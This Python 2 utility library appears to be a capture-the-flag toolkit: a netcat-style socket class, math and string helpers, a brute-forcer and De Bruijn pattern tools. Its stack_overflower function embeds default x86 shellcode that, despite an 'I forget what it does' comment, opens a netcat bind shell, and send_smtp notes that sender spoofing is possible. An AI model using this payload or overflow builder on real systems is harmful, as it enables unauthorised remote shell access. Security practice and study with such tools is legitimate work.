#!/usr/bin/env python
"""The Kolobyte Python Library
Tested on Python 2, sorry! Willing to accept testers using Python 3.
"""
import hashlib
import math
import os
import time
import itertools
import socket
import sys
import threading
import re
import select

class Shoe():
    """Socket wrapper to be netcat like.
    Inspired by shoe.rb from crowell @ https://github.com/crowell/shoe.rb
    """
    def __init__(self, host, port):
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._socket.connect((host, port))
        self._socket.setblocking(0)

    def write(self, data):
        """Write `data` to a shoe.
        @note: Requires you to put a \n yourself.
        """
        self._socket.send(data)

    def read_for(self, secs):
        """Read from a shoe for `secs`
        """
        response = b""
        timeout = time.time() + secs
        while True:
            is_ready = select.select([self._socket], [], [], secs)
            try:
                if is_ready:
                    response += self._socket.recv(1)
            except:
                pass
            if timeout < time.time():
                break

        return response

    def read_until(self, mystr, is_regex=False):
        """Read from a shoe until a `mystr` appears. Accepts regex.
        """
        response = b""
        self._socket.setblocking(1)
        if is_regex:
            while not re.findall(mystr, response):
                response += self._socket.recv(1)
        else:
            while response.endswith(mystr) != True:
                response += self._socket.recv(1)
        self._socket.setblocking(1)
        return response

    def read_until_end(self, secs=1):
        """Read from a shoe until the end, defined by no recv for 1 second (default).
        """
        response = b""
        timeout = time.time() + secs
        while True:
            is_ready = select.select([self._socket], [], [], secs)
            try:
                if is_ready:
                    response += self._socket.recv(1)
            except:
                pass
            if timeout < time.time():
                break

        return response

    def tie(self):
        """Tie the shoe and make it interactive.
        """
        self._socket.settimeout(None)
        ## Constantly read off the shoe.
        def _listen():
            while True:
                data = self._socket.recv(4096)
                print(data)

        t = threading.Thread(target = _listen)
        t.daemon = True
        t.start()

        ## Constantly write any new input to the shoe.
        while True:
            payload = sys.stdin.readline()
            if payload == "":
                continue
            self.write(payload)

    def close(self):
        """Close the shoe
        """
        self._socket.close()

class PrimeSieve():
    """Sieve of Eratosthenes, finds prime #s up to n in O(nloglogn)
    Usage: primeSieve = PrimeSieve(500)
           primeSieve.primes[25] = 233
    """
    def __init__(self, n):
        """Init a sieve of primes up to `n`
        """
        # Assume [0,n) are all primes
        primes = [True for i in range(0,n)]
        for i in range(2,int(math.ceil(math.sqrt(n)))):
            if primes[i] is True:
                a = 0
                while (i**2 + a*i < n): # Remove every multiple of i
                    primes[i**2 + a*i] = False
                    a += 1

        self.primes = [i for i in range(2,n) if primes[i] is True]

class Singleton:
    """A non-thread-safe helper class to ease implementing singletons.
    This should be used as a decorator.

    The decorated class can define one `__init__` function that
    takes only the `self` argument. Other than that, there are
    no restrictions that apply to the decorated class.

    Limitations: The decorated class cannot be inherited from.

    Example:
    @Singleton
    class SharedSecretHolder:
        secret = "Foo"
        def __init__(self):
            print("SharedSecretHolder Singleton initalized!")
            self.secret = "It's a secret!"

    secret_holder1 = SharedSecretHolder.Instance()
    secret_holder2 = SharedSecretHolder.Instance()
    print(secret_holder2.secret)
    secret_holder1.secret = "The secret changed, but the other instance picked it up!"
    print(secret_holder2.secret)
    """
    def __init__(self, decorated):
        self._decorated = decorated

    def Instance(self):
        """Use to get the single instance of the Singleton. Upon first use, it calls the singleton's
        init function.
        """
        try:
            return self._instance
        except AttributeError:
            self._instance = self._decorated()
            return self._instance

    def __call__(self):
        raise TypeError('Singletons must be accessed through `Instance()`.')

    def __instancecheck__(self, inst):
        return isinstance(inst, self._decorated)

def md5(s):
    """Simpler md5sum a string
    """
    return hashlib.md5(s).hexdigest()

def isPrime(n):
    """Simple, and slow check if a number is prime or not
    """
    if n == 2 or n == 3:
        return True
    if n < 2 or n % 2 == 0:
        return False # 1, negative or even
    for i in xrange(3, int(math.sqrt(n))+1, 2):
        if n % i == 0:
            return False
    return True

def num(s):
    """Convert a string to an integer or float
    """
    try:
        return int(s)
    except ValueError:
        return float(s)

def rotn(s, n, letters="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"):
    """Rotate a string's characters by n
    """
    ans = ""
    for c in s:
        if not c.isalpha():
            ans += c
            continue
        ans += letters[(letters.index(c) + n) % len(letters)]
    return ans

def connect_pop3(mailserver, username, password):
    """Connect to a pop3 mailserver and return a handle to it
    """
    import poplib
    p = poplib.POP3(mailserver)
    p.user(username)
    p.pass_(password)

    return p

def dns_a_record(host):
    """Returns the DNS A-record of a host
    """
    try:
        import dns.resolver as dns
    except ImportError as e:
        print("[ERROR] Try pip install dnspython, or https://github.com/rthalley/dnspython")
        raise

    return dns.query(host,"A")

def send_smtp(mailserver, port, fromaddr, toaddr, subject, body):
    """Sends a message consisting of a `subject`, and `body`, from a `fromaddr`, to a `toaddr`.
    Spoofing is possible. Port must be a number.
    """
    import smtplib

    fromheader = 'From: %s\r\n' % fromaddr
    toheader = 'To: %s\r\n\r\n' % toaddr

    msg = '%s\n%s\n%s\n\n%s' % (fromheader, toheader, subject, body)

    s = smtplib.SMTP(mailserver, port)
    s.sendmail(fromaddr, toaddr, msg)
    s.quit()


def fork_exec(prog, args):
    """Lower level subprocess.Popen(). Uses fork() and execv() instead.
    Prog must be a string, and args must be a list.
    """
    pid = os.fork() # Returns 0 in the child, and the real pid in the parent
    if pid == 0:
        os.execv(prog, args)
    else:
        pass

def strxor(str1, str2):
    """Xors 2 strings character by character.
    """
    minlen = min(len(str1), len(str2))
    ans = ""
    for (c1, c2) in zip(str1[:minlen], str2[:minlen]):
        ans += chr(ord(c1) ^ ord(c2))
    return ans


def timeme(method):
    """@timeme decorator. Place before any function you want timed.

    Example:
        @timeme
        def print_after_three(s):
            time.sleep(3)
            return s
        print_after_three("testing timeme")
        >> ('print_after_three', 3003, 'ms')
    """
    def wrapper(*args, **kw):
        startTime = int(round(time.time() * 1000))
        result = method(*args, **kw)
        endTime = int(round(time.time() * 1000))

        print(method.__name__, endTime - startTime,'ms')
        return result

    return wrapper


def cyclic_pattern(maxlen, n = 3):
    """Generate the De Bruijn Sequence (a cyclic pattern) up to `maxlen` characters and subsequences
    of length `n`. Modified from github.com/longld/peda/.
    """
    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    k = len(charset)
    a = [0] * k * n
    sequence = []
    def db(t, p):
        if len(sequence) == maxlen:
            return

        if t > n:
            if n % p == 0:
                for j in range(1, p + 1):
                    sequence.append(charset[a[j]])
                    if len(sequence) == maxlen:
                        return
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)
    db(1,1)
    return ''.join(sequence)

def cyclic_pattern_search(needle, size = 100000):
    """Search a the de bruijin cylic pattern for a `needle` and return its offset.
    """
    pattern = cyclic_pattern(size)
    pos = pattern.find(needle)
    return pos

def stack_overflower(padlen, noplen, payload = None):
    if payload is None:
        # Some default shellcode. I forget what it does...
        payload = "\xeb\x36\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xcd\x80\x5e\x31\xc0\x88\x46\x07" \
                  "\x88\x46\x10\x88\x46\x1a\x89\x76\x1b\x8d\x5e\x08\x89\x5e\x1f\x8d\x5e\x11\x89\x5e" \
                  "\x23\x89\x46\x27\xb0\x0b\x89\xf3\x8d\x4e\x1b\x8d\x56\x27\xcd\x80\xe8\xc5\xff\xff" \
                  "\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x76\x70\x39\x39\x39\x39\x23\x2d\x65" \
                  "\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43" \
                  "\x44\x44\x44\x44"
    pad = cyclic_pattern(padlen)
    nopsled = "\x90"*noplen
    return pad+nopsled+payload

def bruteforce(charset, minlength, maxlength):
    """Efficient dumb bruteforcer generator.

    Example:
        # Generate every string 3 to 10 characters long, from the ascii_lowercase charset.
        for word in bruteforce(string.ascii_lowercase, 3, 10):
            print(word)
    """
    return (''.join(candidate)
        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
        for i in range(minlength, maxlength + 1)))
